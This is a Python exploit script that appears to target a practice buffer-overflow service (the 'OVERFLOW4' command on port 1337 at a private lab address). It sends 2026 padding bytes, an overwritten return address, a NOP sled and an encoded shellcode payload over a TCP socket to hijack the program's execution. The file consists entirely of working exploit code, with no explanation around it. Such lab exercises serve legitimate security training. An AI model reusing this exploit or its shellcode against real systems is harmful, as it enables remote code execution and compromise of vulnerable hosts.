import socket

ip = "10.10.171.27"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
#\x00\x11\x40\x5f\xb8\xee
payload = (
    "\xd9\xc6\xba\x6e\xec\x23\x3d\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
    "\x52\x31\x56\x17\x83\xee\xfc\x03\x38\xff\xc1\xc8\x38\x17\x87"
    "\x33\xc0\xe8\xe8\xba\x25\xd9\x28\xd8\x2e\x4a\x99\xaa\x62\x67"
    "\x52\xfe\x96\xfc\x16\xd7\x99\xb5\x9d\x01\x94\x46\x8d\x72\xb7"
    "\xc4\xcc\xa6\x17\xf4\x1e\xbb\x56\x31\x42\x36\x0a\xea\x08\xe5"
    "\xba\x9f\x45\x36\x31\xd3\x48\x3e\xa6\xa4\x6b\x6f\x79\xbe\x35"
    "\xaf\x78\x13\x4e\xe6\x62\x70\x6b\xb0\x19\x42\x07\x43\xcb\x9a"
    "\xe8\xe8\x32\x13\x1b\xf0\x73\x94\xc4\x87\x8d\xe6\x79\x90\x4a"
    "\x94\xa5\x15\x48\x3e\x2d\x8d\xb4\xbe\xe2\x48\x3f\xcc\x4f\x1e"
    "\x67\xd1\x4e\xf3\x1c\xed\xdb\xf2\xf2\x67\x9f\xd0\xd6\x2c\x7b"
    "\x78\x4f\x89\x2a\x85\x8f\x72\x92\x23\xc4\x9f\xc7\x59\x87\xf7"
    "\x24\x50\x37\x08\x23\xe3\x44\x3a\xec\x5f\xc2\x76\x65\x46\x15"
    "\x78\x5c\x3e\x89\x87\x5f\x3f\x80\x43\x0b\x6f\xba\x62\x34\xe4"
    "\x3a\x8a\xe1\xab\x6a\x24\x5a\x0c\xda\x84\x0a\xe4\x30\x0b\x74"
    "\x14\x3b\xc1\x1d\xbf\xc6\x82\x2b\x46\xee\xf4\x44\x44\xee\xe9"
    "\xc8\xc1\x08\x63\xe1\x87\x83\x1c\x98\x8d\x5f\xbc\x65\x18\x1a"
    "\xfe\xee\xaf\xdb\xb1\x06\xc5\xcf\x26\xe7\x90\xad\xe1\xf8\x0e"
    "\xd9\x6e\x6a\xd5\x19\xf8\x97\x42\x4e\xad\x66\x9b\x1a\x43\xd0"
    "\x35\x38\x9e\x84\x7e\xf8\x45\x75\x80\x01\x0b\xc1\xa6\x11\xd5"
    "\xca\xe2\x45\x89\x9c\xbc\x33\x6f\x77\x0f\xed\x39\x24\xd9\x79"
    "\xbf\x06\xda\xff\xc0\x42\xac\x1f\x70\x3b\xe9\x20\xbd\xab\xfd"
    "\x59\xa3\x4b\x01\xb0\x67\x6b\xe0\x10\x92\x04\xbd\xf1\x1f\x49"
    "\x3e\x2c\x63\x74\xbd\xc4\x1c\x83\xdd\xad\x19\xcf\x59\x5e\x50"
    "\x40\x0c\x60\xc7\x61\x05"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
